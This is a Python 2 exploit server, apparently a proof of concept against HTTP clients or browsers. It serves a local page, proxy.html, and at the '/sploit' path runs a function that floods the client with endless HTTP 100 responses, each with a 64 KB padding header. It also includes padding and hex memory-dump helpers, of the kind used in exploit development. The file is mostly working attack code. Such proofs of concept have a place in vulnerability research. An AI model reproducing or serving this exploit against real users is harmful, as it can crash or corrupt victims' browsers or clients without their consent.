import BaseHTTPServer, json, sys, socket, time;

def sploit(oHTTPServer, sBody):
  print ".",;
  while 1:
    oHTTPServer.send_response(100);
    oHTTPServer.send_header("padding", 64 * "A" * 1024);
    oHTTPServer.end_headers();
  oHTTPServer.send_response(200);
  oHTTPServer.send_header("padding", 64 * "A" * 1024);
  oHTTPServer.end_headers();

class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
  def handle_one_request(self, *txArgs, **dxArgs):
    try:
      return BaseHTTPServer.BaseHTTPRequestHandler.handle_one_request(self, *txArgs, **dxArgs);
    except socket.error:
      pass;
  def do_GET(self):
    self.do_GET_or_POST();
  def do_POST(self):
    self.do_GET_or_POST();
    
  def __sendFileResponse(self, iCode, sFilePath):
      try:
        oFile = open(sFilePath, "rb");
        sContent = oFile.read();
        oFile.close();
      except:
        self.__sendResponse(500, "Cannot find %s" % sFilePath);
      else:
        self.__sendResponse(iCode, sContent);
  def __sendResponse(self, iCode, sContent):
    self.send_response(iCode);
    self.send_header("accept-ranges", "bytes");
    self.send_header("cache-control", "no-cache, must-revalidate");
    self.send_header("content-length", str(len(sContent)));
    self.send_header("content-type", "text/html");
    self.send_header("date", "Sat Aug 28 1976 09:15:00 GMT");
    self.send_header("expires", "Sat Aug 28 1976 09:15:00 GMT");
    self.send_header("pragma", "no-cache");
    self.end_headers();
    self.wfile.write(sContent);
    self.wfile.close();

  def do_GET_or_POST(self):
    try:
      try:
        iContentLength = int(self.headers.getheader("content-length"));
      except:
        sBody = "";
      else:
        sBody = self.rfile.read(iContentLength);
      if self.path in gdsFiles:
        return self.__sendFileResponse(200, gdsFiles[self.path]);
      elif self.path in gdsFunctions:
        return gdsFunctions[self.path](self, sBody);
      else:
        return self.__sendResponse(404, "Not found");
    except:
      self.server.server_close();
      raise;

def pad(sTemplate, iSize):
  iPadding = iSize - len(sTemplate % "");
  return sTemplate % (iPadding * "A");

def dump(sMemory):
  asDWords = []; iDWord = 0; asBytes = []; asChars = [];
  print "-%s-.-%s-.-%s" % (
      ("%d DWORDS" % (len(sMemory) >> 2)).center(35, "-"),
      ("%d BYTES" % len(sMemory)).center(47, "-"),
      "ASCII".center(16, "-"));
  for iIndex in xrange(len(sMemory)):
    sByte = sMemory[iIndex];
    iByte = ord(sByte);
    asChars.append(0x1f < iByte < 0x80 and sByte or ".");
    asBytes.append("%02X" % iByte);
    iBitOffset = (iIndex % 4) * 8;
    iDWord += iByte << iBitOffset;
    if iBitOffset == 24 or (iIndex == len(sMemory) - 1):
      asDWords.append({
        0: "      %02X",
        8: "    %04X",
        16:"  %06X",
        24:"%08X"
      }[iBitOffset] % iDWord);
      iDWord = 0;
    if (iIndex % 16 == 15) or (iIndex == len(sMemory) - 1):
      print " %-35s | %-47s | %s" % (" ".join(asDWords), " ".join(asBytes), "".join(asChars));
      asDWords = []; asBytes = []; asChars = [];

if __name__ == "__main__":
  gdsFiles = {
    "/": "proxy.html",
  }
  gdsFunctions = {
    "/sploit": sploit,
  }
  txAddress = ("localhost", 28876);
  oHTTPServer = BaseHTTPServer.HTTPServer(txAddress, RequestHandler);
  print "Serving at: http://%s:%d" % txAddress;
  try:
    oHTTPServer.serve_forever();
  except KeyboardInterrupt:
    pass;
  oHTTPServer.server_close();

